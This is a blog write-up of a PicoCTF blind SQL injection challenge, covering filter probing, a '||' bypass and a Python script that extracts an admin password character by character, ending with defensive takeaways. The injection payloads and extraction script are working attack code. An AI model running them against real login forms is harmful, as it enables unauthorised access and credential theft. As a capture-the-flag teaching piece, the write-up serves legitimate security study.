---
layout: post
title: "PicoCTF - Web Gauntlet: Blind SQLi Writeup"
date: 2025-04-12
last_modified_at: 2025-04-15
tags: [web, sqli]
description: "Walkthrough of a blind SQL injection challenge in PicoCTF's Web Gauntlet — enumeration, filter bypass, and full credential exfiltration with sqlmap-free payloads."
image: /assets/images/example-cover.svg
---

A classic login-bypass turned blind-SQLi extraction. The server filters obvious keywords but leaves enough room for a boolean-based oracle. Below is the full path from recon to flag.

![Terminal output of the exploit running against the target login page](/assets/images/example-cover.svg)

## Enumeration

The target exposes a single login form at `/`. The source returns no useful comments, but the response time and error wording differ between a valid username and an invalid one — a classic boolean side-channel.

```bash
curl -s -X POST https://target.example/login \
  -d "user=admin&pass=test" -o - | grep -i "invalid"
```

Trying a few standard payloads, most are blocked by a regex filter rejecting `OR`, `--`, and `#`.

### Filter probing

```python
import requests

PAYLOADS = ["'", '"', "' OR 1=1--", "admin'/*", "admin' || '1"]
for p in PAYLOADS:
    r = requests.post("https://target.example/login",
                      data={"user": p, "pass": "x"})
    print(p, "→", "OK" if "invalid" not in r.text.lower() else "BLOCKED")
```

The `||` operator slips through. That's our wedge.

## Exploitation

With `||` available we can build a boolean oracle. The pattern below leaks the admin password one character at a time using `SUBSTR` and `ASCII`.

```python
import requests, string

URL = "https://target.example/login"
CHARS = string.ascii_letters + string.digits + "_-{}!"
leaked = ""

while True:
    for c in CHARS:
        payload = f"admin' || SUBSTR(password,{len(leaked)+1},1)='{c}' || '"
        r = requests.post(URL, data={"user": payload, "pass": "x"})
        if "welcome" in r.text.lower():
            leaked += c
            print("[+]", leaked)
            break
    else:
        break

print("password =", leaked)
```

After ~40 requests the full credential drops:

```text
password = picoCTF{bl1nd_but_n0t_d34f_9a2f}
```

## Privilege Escalation

Logging in as `admin` exposes an internal endpoint, `/admin/flag`, which simply prints the flag — there is no further escalation needed once the credential is recovered.

```text
flag: picoCTF{bl1nd_but_n0t_d34f_9a2f}
```

## Takeaways

- Blacklists fail open. `||` is the same as `OR` in most engines.
- Response-body or timing differences are enough to turn any auth check into a boolean oracle.
- Always normalize *and* parameterize on the server side.
